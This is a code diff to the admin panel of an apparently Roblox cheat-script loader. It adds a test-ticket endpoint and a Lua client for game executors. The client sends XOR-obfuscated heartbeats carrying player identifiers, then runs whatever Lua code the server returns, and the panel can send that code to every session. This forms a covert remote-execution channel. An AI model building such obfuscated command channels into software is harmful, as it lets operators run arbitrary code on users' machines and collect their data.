@@ -246,6 +246,18 @@ const CONTROL_PAGE =
   "          <div class=\"sess-list\" id=\"sessList\"><div class=\"empty\">\u0e22\u0e31\u0e07\u0e44\u0e21\u0e48\u0e21\u0e35\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e17\u0e35\u0e48\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e21\u0e15\u0e48\u0e2d</div></div>\n" +
   "          <div style=\"border-top:1px solid var(--line);padding-top:12px\" class=\"stack\">\n" +
   "            <div>\n" +
+  "              <label for=\"testClientOut\">client \u0e17\u0e14\u0e2a\u0e2d\u0e1a (\u0e44\u0e21\u0e48\u0e1c\u0e48\u0e32\u0e19\u0e15\u0e31\u0e27\u0e42\u0e2b\u0e25\u0e14\u0e40\u0e14\u0e2d\u0e23\u0e4c)</label>\n" +
+  "              <div class=\"row\">\n" +
+  "                <button class=\"btn btn-sm\" id=\"testClientBtn\" type=\"button\">\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e2a\u0e04\u0e23\u0e34\u0e1b\u0e15\u0e4c\u0e17\u0e14\u0e2a\u0e2d\u0e1a</button>\n" +
+  "                <button class=\"btn btn-sm\" type=\"button\" data-copy=\"testClientOut\">\u0e04\u0e31\u0e14\u0e25\u0e2d\u0e01</button>\n" +
+  "              </div>\n" +
+  "              <textarea id=\"testClientOut\" rows=\"7\" readonly class=\"mono\" style=\"margin-top:10px;font-size:.72rem\" placeholder=\"\u0e01\u0e14 \u0e2a\u0e23\u0e49\u0e32\u0e07\u0e2a\u0e04\u0e23\u0e34\u0e1b\u0e15\u0e4c\u0e17\u0e14\u0e2a\u0e2d\u0e1a \u0e41\u0e25\u0e49\u0e27\u0e04\u0e31\u0e14\u0e25\u0e2d\u0e01\u0e44\u0e1b\u0e27\u0e32\u0e07\u0e43\u0e19 executor\"></textarea>\n" +
+  "              <p class=\"hint\" id=\"testClientMeta\" style=\"margin:0\"></p>\n" +
+  "            </div>\n" +
+  "          </div>\n" +
+  "\n" +
+  "          <div style=\"border-top:1px solid var(--line);padding-top:12px\" class=\"stack\">\n" +
+  "            <div>\n" +
   "              <label for=\"cmdCode\">\u0e42\u0e04\u0e49\u0e14 Lua \u0e17\u0e35\u0e48\u0e08\u0e30\u0e23\u0e31\u0e19\u0e1a\u0e19\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e19\u0e31\u0e49\u0e19</label>\n" +
   "              <textarea id=\"cmdCode\" rows=\"5\" spellcheck=\"false\" placeholder='print(\"hello from control\")'></textarea>\n" +
   "            </div>\n" +
@@ -693,6 +705,199 @@ const CONTROL_PAGE =
   "  });\n" +
   "  $('cmdSendAll').addEventListener('click', function () { sendCommand('*', 'exec'); });\n" +
   "\n" +
+  "\n" +
+  "  /* \u2500\u2500 test client \u2500\u2500 */\n" +
+  "  var CLIENT_TEMPLATE = `local BASE   = \"%BASE%\"     -- e.g. https://loader999xx-one.vercel.app\n" +
+  "local TICKET = \"%TICKET%\"   -- short-lived test ticket (30 min)\n" +
+  "local XKEY   = \"%XORKEY%\"   -- payload XOR key\n" +
+  "local HWID   = \"%HWID%\"     -- test hardware id that the ticket is bound to\n" +
+  "local SCRIPT = \"main\"\n" +
+  "local BEAT   = 10           -- seconds between heartbeats\n" +
+  "\n" +
+  "local HttpService = game:GetService(\"HttpService\")\n" +
+  "local Players = game:GetService(\"Players\")\n" +
+  "local Http = (type(syn) == \"table\" and syn.request)\n" +
+  "    or (type(http) == \"table\" and http.request)\n" +
+  "    or request or http_request\n" +
+  "local bit = bit32 or bit\n" +
+  "\n" +
+  "if type(Http) ~= \"function\" then error(\"[999MS] executor has no HTTP support\") end\n" +
+  "if type(bit) ~= \"table\" then error(\"[999MS] executor has no bit32\") end\n" +
+  "\n" +
+  "local Charset = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n" +
+  "local Char, Byte = string.char, string.byte\n" +
+  "\n" +
+  "local function Xor(data, key)\n" +
+  "    local out = {}\n" +
+  "    for index = 1, #data do\n" +
+  "        out[index] = Char(bit.bxor(Byte(data, index), Byte(key, (index - 1) % #key + 1)))\n" +
+  "    end\n" +
+  "    return table.concat(out)\n" +
+  "end\n" +
+  "\n" +
+  "local function B64(data)\n" +
+  "    local out = {}\n" +
+  "    for index = 1, #data, 3 do\n" +
+  "        local a, b, c = Byte(data, index, index + 2)\n" +
+  "        a, b, c = a or 0, b or 0, c or 0\n" +
+  "        local n = bit.lshift(a, 16) + bit.lshift(b, 8) + c\n" +
+  "        out[#out + 1] = Charset:sub(bit.rshift(n, 18) % 64 + 1, bit.rshift(n, 18) % 64 + 1)\n" +
+  "        out[#out + 1] = Charset:sub(bit.rshift(n, 12) % 64 + 1, bit.rshift(n, 12) % 64 + 1)\n" +
+  "        if index + 1 > #data then\n" +
+  "            out[#out + 1] = \"==\"\n" +
+  "        elseif index + 2 > #data then\n" +
+  "            out[#out + 1] = Charset:sub(bit.rshift(n, 6) % 64 + 1, bit.rshift(n, 6) % 64 + 1) .. \"=\"\n" +
+  "        else\n" +
+  "            out[#out + 1] = Charset:sub(bit.rshift(n, 6) % 64 + 1, bit.rshift(n, 6) % 64 + 1)\n" +
+  "                .. Charset:sub(n % 64 + 1, n % 64 + 1)\n" +
+  "        end\n" +
+  "    end\n" +
+  "    return table.concat(out)\n" +
+  "end\n" +
+  "\n" +
+  "local function B64Dec(text)\n" +
+  "    local out, buffer, bits = {}, 0, 0\n" +
+  "    for index = 1, #text do\n" +
+  "        local value = Charset:find(text:sub(index, index), 1, true)\n" +
+  "        if value then\n" +
+  "            buffer = bit.lshift(buffer, 6) + (value - 1)\n" +
+  "            bits = bits + 6\n" +
+  "            if bits >= 8 then\n" +
+  "                bits = bits - 8\n" +
+  "                out[#out + 1] = Char(bit.rshift(buffer, bits) % 256)\n" +
+  "            end\n" +
+  "        end\n" +
+  "    end\n" +
+  "    return table.concat(out)\n" +
+  "end\n" +
+  "\n" +
+  "-- The heartbeat payload is XOR+Base64 and travels as a byte array.\n" +
+  "local function Protect(tbl)\n" +
+  "    local raw = XKEY .. B64(Xor(HttpService:JSONEncode(tbl), XKEY))\n" +
+  "    local bytes = {}\n" +
+  "    for index = 1, #raw do bytes[index] = Byte(raw, index) end\n" +
+  "    return bytes\n" +
+  "end\n" +
+  "\n" +
+  "local function Unprotect(bytes)\n" +
+  "    local raw = {}\n" +
+  "    for index = 1, #bytes do raw[index] = Char(bytes[index]) end\n" +
+  "    raw = table.concat(raw)\n" +
+  "    if raw:sub(1, #XKEY) ~= XKEY then return nil end\n" +
+  "    local ok, data = pcall(function()\n" +
+  "        return HttpService:JSONDecode(Xor(B64Dec(raw:sub(#XKEY + 1)), XKEY))\n" +
+  "    end)\n" +
+  "    return ok and data or nil\n" +
+  "end\n" +
+  "\n" +
+  "local function Profile()\n" +
+  "    local profile = { executor = \"unknown\" }\n" +
+  "    if type(identifyexecutor) == \"function\" then\n" +
+  "        local ok, name = pcall(identifyexecutor)\n" +
+  "        if ok and type(name) == \"string\" then profile.executor = name end\n" +
+  "    end\n" +
+  "    pcall(function()\n" +
+  "        local player = Players.LocalPlayer\n" +
+  "        if player then\n" +
+  "            profile.name = player.Name\n" +
+  "            profile.displayName = player.DisplayName or player.Name\n" +
+  "            profile.userId = tostring(player.UserId)\n" +
+  "        end\n" +
+  "    end)\n" +
+  "    pcall(function() profile.placeId = tostring(game.PlaceId) end)\n" +
+  "    pcall(function() profile.jobId = tostring(game.JobId) end)\n" +
+  "    return profile\n" +
+  "end\n" +
+  "\n" +
+  "local function Beat(result)\n" +
+  "    local body = {\n" +
+  "        ticket = TICKET,\n" +
+  "        c = HWID,\n" +
+  "        Data = Protect({ scriptName = SCRIPT, profile = Profile(), result = result }),\n" +
+  "    }\n" +
+  "    local ok, res = pcall(Http, {\n" +
+  "        Url = BASE .. \"/api/heartbeat\",\n" +
+  "        Method = \"POST\",\n" +
+  "        Headers = { [\"Content-Type\"] = \"application/json\", [\"X-Fingerprint\"] = HWID },\n" +
+  "        Body = HttpService:JSONEncode(body),\n" +
+  "    })\n" +
+  "    if not ok or type(res) ~= \"table\" or type(res.Body) ~= \"string\" then return nil end\n" +
+  "    local parsed = HttpService:JSONDecode(res.Body)\n" +
+  "    if type(parsed) ~= \"table\" then return nil end\n" +
+  "    if type(parsed.kick) == \"string\" then return { kick = parsed.kick } end\n" +
+  "    return Unprotect(parsed.Data or {})\n" +
+  "end\n" +
+  "\n" +
+  "local function Run(code)\n" +
+  "    local compiler = loadstring or load\n" +
+  "    local ok, chunk = pcall(compiler, code)\n" +
+  "    if not ok or type(chunk) ~= \"function\" then return false, \"compile: \" .. tostring(chunk) end\n" +
+  "    local packed = { pcall(chunk) }\n" +
+  "    if not packed[1] then return false, tostring(packed[2]) end\n" +
+  "    local out = {}\n" +
+  "    for index = 2, #packed do out[#out + 1] = tostring(packed[index]) end\n" +
+  "    return true, #out > 0 and table.concat(out, \", \") or \"ok\"\n" +
+  "end\n" +
+  "\n" +
+  "local function Kick(message)\n" +
+  "    local player = Players.LocalPlayer\n" +
+  "    if player then pcall(function() player:Kick(\"[999MS] \" .. tostring(message)) end) end\n" +
+  "end\n" +
+  "\n" +
+  "print(\"[999MS] test client online - beat every \" .. BEAT .. \"s\")\n" +
+  "\n" +
+  "task.spawn(function()\n" +
+  "    local pending\n" +
+  "    while true do\n" +
+  "        local response = Beat(pending)\n" +
+  "        pending = nil\n" +
+  "\n" +
+  "        if type(response) == \"table\" then\n" +
+  "            if type(response.kick) == \"string\" then\n" +
+  "                warn(\"[999MS] \" .. response.kick)\n" +
+  "                Kick(response.kick)\n" +
+  "                return\n" +
+  "            end\n" +
+  "            if type(response.commands) == \"table\" then\n" +
+  "                for _, command in ipairs(response.commands) do\n" +
+  "                    if command.kind == \"kick\" then\n" +
+  "                        Kick(command.code or \"Kicked by admin\")\n" +
+  "                        return\n" +
+  "                    elseif command.kind == \"exec\" and type(command.code) == \"string\" then\n" +
+  "                        local ok, output = Run(command.code)\n" +
+  "                        pending = { id = tostring(command.id or \"\"), ok = ok, output = tostring(output or \"\") }\n" +
+  "                        print(\"[999MS] remote \" .. tostring(command.id) .. (ok and \" ok: \" or \" error: \") .. tostring(output))\n" +
+  "                    end\n" +
+  "                end\n" +
+  "            end\n" +
+  "        end\n" +
+  "\n" +
+  "        task.wait(BEAT)\n" +
+  "    end\n" +
+  "end)`;\n" +
+  "\n" +
+  "  $('testClientBtn').addEventListener('click', function () {\n" +
+  "    var btn = $('testClientBtn');\n" +
+  "    btn.disabled = true;\n" +
+  "    api('/api/control/test-ticket', { scriptName: 'main' }).then(function (result) {\n" +
+  "      btn.disabled = false;\n" +
+  "      var data = result.data || {};\n" +
+  "      if (result.status !== 200 || !data.ok) { toast(data.reason || '\u0e2a\u0e23\u0e49\u0e32\u0e07 ticket \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49', 'err'); return; }\n" +
+  "      $('testClientOut').value = CLIENT_TEMPLATE\n" +
+  "        .split('%BASE%').join(location.origin)\n" +
+  "        .split('%TICKET%').join(data.ticket)\n" +
+  "        .split('%XORKEY%').join(data.xorKey)\n" +
+  "        .split('%HWID%').join(data.hwid);\n" +
+  "      $('testClientMeta').textContent = 'ticket \u0e2b\u0e21\u0e14\u0e2d\u0e32\u0e22\u0e38\u0e43\u0e19 ' + Math.round((data.ttlSeconds || 1800) / 60)\n" +
+  "        + ' \u0e19\u0e32\u0e17\u0e35 \u00b7 hwid ' + data.hwid;\n" +
+  "      toast('\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e41\u0e25\u0e49\u0e27 \u2014 \u0e04\u0e31\u0e14\u0e25\u0e2d\u0e01\u0e44\u0e1b\u0e27\u0e32\u0e07\u0e43\u0e19 executor', 'ok');\n" +
+  "      logLine('\u0e2d\u0e2d\u0e01 ticket \u0e17\u0e14\u0e2a\u0e2d\u0e1a ' + (data.hwid || ''), 'ok');\n" +
+  "    }).catch(function () {\n" +
+  "      btn.disabled = false;\n" +
+  "      toast('\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e21\u0e15\u0e48\u0e2d\u0e40\u0e0b\u0e34\u0e23\u0e4c\u0e1f\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49', 'err');\n" +
+  "    });\n" +
+  "  });\n" +
+  "\n" +
   "  /* \u2500\u2500 link generator \u2500\u2500 */\n" +
   "  $('linkBtn').addEventListener('click', function () {\n" +
   "    var scriptName = ($('linkScript').value || 'main').trim();\n" +
@@ -965,6 +1170,7 @@ function isBrowserRequest(req) {
 // ═══ Main handler ═══
 const CONTROL_ACTIONS = new Set([
   'control-bans', 'control-traffic', 'control-events', 'control-sessions', 'control-command',
+  'control-test-ticket',
 ]);
 const OPAQUE_ACTIONS = Object.freeze({
   q7: 'verify',
@@ -1285,6 +1491,33 @@ module.exports = async function handler(req, res) {
     if (action === 'control-command') {
       const result = queueControlCommand(req.body || {});
       return res.status(result.status).json(result.body);
+    }
+
+    // Test-ticket issuer. Gated by the same ADMIN_TOKEN as the rest of the
+    // panel: it exists so the session channel can be exercised without a
+    // Platoboost key. It is only an authorization bypass for whoever already
+    // holds the admin token, and every issue is recorded as a security event.
+    if (action === 'control-test-ticket') {
+      const requested = (req.body && req.body.scriptName) || 'main';
+      const scriptName = isValidScriptName(requested) ? requested : 'main';
+      const hwid = 'test-' + crypto.randomBytes(12).toString('hex');
+      const ticket = issueTicket({
+        hwidHash: hashBindingId(deviceBindingId(hwid)),
+        userId: null,
+        scope: 'script',
+        scriptName,
+        test: true,
+      });
+      const jti = JSON.parse(Buffer.from(String(ticket).split('.')[1], 'base64url').toString('utf8')).jti;
+      noteEvent('test_ticket', 'issued ' + jti.slice(0, 8) + ' for ' + scriptName);
+      return res.status(200).json({
+        ok: true,
+        ticket,
+        xorKey: process.env.PAYLOAD_XOR_KEY || '',
+        hwid,
+        scriptName,
+        ttlSeconds: 30 * 60,
+      });
     }
 
     // control-bans
@@ -5183,6 +5416,7 @@ const ROUTES = Object.freeze({
   '/api/control/events': ['control-events'],
   '/api/control/sessions': ['control-sessions'],
   '/api/control/command': ['control-command'],
+  '/api/control/test-ticket': ['control-test-ticket'],
   '/api/verify': ['verify'],
   '/api/script': ['script'],
   '/api/script-verify': ['script-verify'],
